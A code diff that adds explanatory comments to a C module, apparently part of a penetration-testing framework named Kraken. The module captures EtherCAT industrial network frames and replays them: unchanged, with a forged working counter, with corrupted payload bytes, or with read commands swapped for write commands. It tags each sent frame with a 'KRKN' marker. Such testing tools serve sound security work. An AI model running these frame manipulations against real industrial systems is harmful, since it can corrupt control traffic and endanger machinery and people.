@@ -1,3 +1,5 @@
+// EtherCAT MITM Module
+// Tests master's handling of captured/modified/replayed frames
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -8,6 +10,8 @@
 #include "kraken_module_abi.h"
 #include "kraken_module_abi_v2.h"
 
+// Kraken signature for Wireshark filtering: "KRKN" = 0x4B524B4E
+// Filter in Wireshark: frame contains "KRKN"
 #define KRAKEN_SIG "KRKN"
 #define KRAKEN_SIG_LEN 4
 
@@ -21,38 +25,40 @@ typedef struct {
 static captured_frame_t captured[MAX_CAPTURED];
 static size_t capture_count = 0;
 
+// Inject Kraken signature into EtherCAT frame data section
+// Returns new length or 0 on failure
 static size_t inject_signature(uint8_t *frame, size_t len) {
-    if (len < 14) return 0; 
+    if (len < 14) return 0;  // Need at least header + datagram header
 
-   
+    // Parse EtherCAT header
     uint16_t header = frame[0] | (frame[1] << 8);
     uint16_t frame_len = header & 0x7FF;
     uint8_t frame_type = (header >> 12) & 0x0F;
 
-    if (frame_type != 1) return len; 
-    if (frame_len < 12) return len;  
+    if (frame_type != 1) return len;  // Not EtherCAT command frame
+    if (frame_len < 12) return len;   // Too short for datagram
 
-   
+    // Get datagram data length
     uint16_t len_flags = frame[8] | (frame[9] << 8);
     uint16_t data_len = len_flags & 0x7FF;
 
-   
-   
+    // Insert signature at start of data (after datagram header at offset 12)
+    // Shift existing data right by KRAKEN_SIG_LEN
     size_t new_len = len + KRAKEN_SIG_LEN;
-    if (new_len > 1500) return len; 
+    if (new_len > 1500) return len;  // Won't fit
 
-   
+    // Move data after offset 12 to make room
     memmove(frame + 12 + KRAKEN_SIG_LEN, frame + 12, len - 12);
 
-   
+    // Insert signature
     memcpy(frame + 12, KRAKEN_SIG, KRAKEN_SIG_LEN);
 
-   
+    // Update header length
     uint16_t new_frame_len = frame_len + KRAKEN_SIG_LEN;
     frame[0] = new_frame_len & 0xFF;
     frame[1] = ((new_frame_len >> 8) & 0x07) | (frame_type << 4);
 
-   
+    // Update datagram data length
     uint16_t new_data_len = data_len + KRAKEN_SIG_LEN;
     frame[8] = new_data_len & 0xFF;
     frame[9] = (len_flags & 0xF800) | ((new_data_len >> 8) & 0x07);
@@ -60,6 +66,7 @@ static size_t inject_signature(uint8_t *frame, size_t len) {
     return new_len;
 }
 
+// Capture frames from the network
 static int capture_frames(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                           KrakenRunResultV2 *result, int duration_ms) {
     capture_count = 0;
@@ -69,9 +76,9 @@ static int capture_frames(KrakenConnectionHandle conn, const KrakenConnectionOps
     while (clock() < end && capture_count < MAX_CAPTURED) {
         uint8_t buf[1500];
         int64_t n = ops->recv(conn, buf, sizeof(buf), 50);
-        if (n > 16) {
-           
-           
+        if (n > 16) { // Minimum EtherCAT frame
+            // Check if it's EtherCAT (type field at offset 12-13 after eth header is in payload)
+            // We receive raw frames so check header
             uint16_t header = buf[14] | (buf[15] << 8);
             uint8_t frame_type = (header >> 12) & 0x0F;
             if (frame_type == 1) {
@@ -89,6 +96,7 @@ static int capture_frames(KrakenConnectionHandle conn, const KrakenConnectionOps
     return (int)capture_count;
 }
 
+// Test 1: Simple replay - send captured frames back with Kraken signature
 static int test_replay(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                        KrakenRunResultV2 *result) {
     if (capture_count == 0) {
@@ -98,13 +106,13 @@ static int test_replay(KrakenConnectionHandle conn, const KrakenConnectionOps *o
 
     int sent = 0;
     for (size_t i = 0; i < capture_count; i++) {
-       
+        // Copy and inject signature (skip eth header, send EtherCAT payload)
         if (captured[i].len > 14) {
             uint8_t modified[1500];
             size_t ecat_len = captured[i].len - 14;
             memcpy(modified, captured[i].data + 14, ecat_len);
 
-           
+            // Inject Kraken signature
             size_t new_len = inject_signature(modified, ecat_len);
 
             if (ops->send(conn, modified, new_len, 50) > 0) {
@@ -120,6 +128,7 @@ static int test_replay(KrakenConnectionHandle conn, const KrakenConnectionOps *o
     return sent;
 }
 
+// Test 2: Modified replay - change WKC in captured frames
 static int test_modified_wkc(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                              KrakenRunResultV2 *result) {
     if (capture_count == 0) {
@@ -136,19 +145,19 @@ static int test_modified_wkc(KrakenConnectionHandle conn, const KrakenConnection
         memcpy(modified, captured[i].data + 14, len - 14);
         size_t ecat_len = len - 14;
 
-       
-       
+        // Find and modify WKC (at end of each datagram)
+        // Simple approach: modify last 2 bytes before any padding
         if (ecat_len > 4) {
             uint16_t header = modified[0] | (modified[1] << 8);
             uint16_t frame_len = header & 0x7FF;
             if (frame_len > 2 && frame_len <= ecat_len - 2) {
-               
+                // Set WKC to 0xFF (invalid high value)
                 modified[frame_len] = 0xFF;
                 modified[frame_len + 1] = 0x00;
             }
         }
 
-       
+        // Inject Kraken signature
         size_t new_len = inject_signature(modified, ecat_len);
 
         if (ops->send(conn, modified, new_len, 50) > 0) {
@@ -163,6 +172,7 @@ static int test_modified_wkc(KrakenConnectionHandle conn, const KrakenConnection
     return sent;
 }
 
+// Test 3: Modified replay - corrupt data payload
 static int test_corrupted_data(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                                KrakenRunResultV2 *result) {
     if (capture_count == 0) {
@@ -179,14 +189,14 @@ static int test_corrupted_data(KrakenConnectionHandle conn, const KrakenConnecti
         memcpy(modified, captured[i].data + 14, len - 14);
         size_t ecat_len = len - 14;
 
-       
+        // Flip some bits in the data section
         if (ecat_len > 14) {
             for (size_t j = 12; j < ecat_len - 2 && j < 20; j++) {
                 modified[j] ^= 0xAA;
             }
         }
 
-       
+        // Inject Kraken signature
         size_t new_len = inject_signature(modified, ecat_len);
 
         if (ops->send(conn, modified, new_len, 50) > 0) {
@@ -201,6 +211,7 @@ static int test_corrupted_data(KrakenConnectionHandle conn, const KrakenConnecti
     return sent;
 }
 
+// Test 4: Command substitution - change command type
 static int test_cmd_substitution(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                                  KrakenRunResultV2 *result) {
     if (capture_count == 0) {
@@ -217,16 +228,16 @@ static int test_cmd_substitution(KrakenConnectionHandle conn, const KrakenConnec
         memcpy(modified, captured[i].data + 14, len - 14);
         size_t ecat_len = len - 14;
 
-       
+        // Change read commands to write commands
         if (ecat_len > 2) {
             uint8_t cmd = modified[2];
-           
+            // APRD(1)->APWR(2), FPRD(4)->FPWR(5), BRD(7)->BWR(8), LRD(10)->LWR(11)
             if (cmd == 1 || cmd == 4 || cmd == 7 || cmd == 10) {
                 modified[2] = cmd + 1;
             }
         }
 
-       
+        // Inject Kraken signature
         size_t new_len = inject_signature(modified, ecat_len);
 
         if (ops->send(conn, modified, new_len, 50) > 0) {
@@ -258,7 +269,7 @@ KRAKEN_API int kraken_run_v2(
 
     add_log_v2(result, "Starting EtherCAT MITM tests");
 
-   
+    // First capture some traffic
     add_log_v2(result, "Phase 1: Capturing traffic (2 seconds)");
     capture_frames(conn, ops, result, 2000);
 
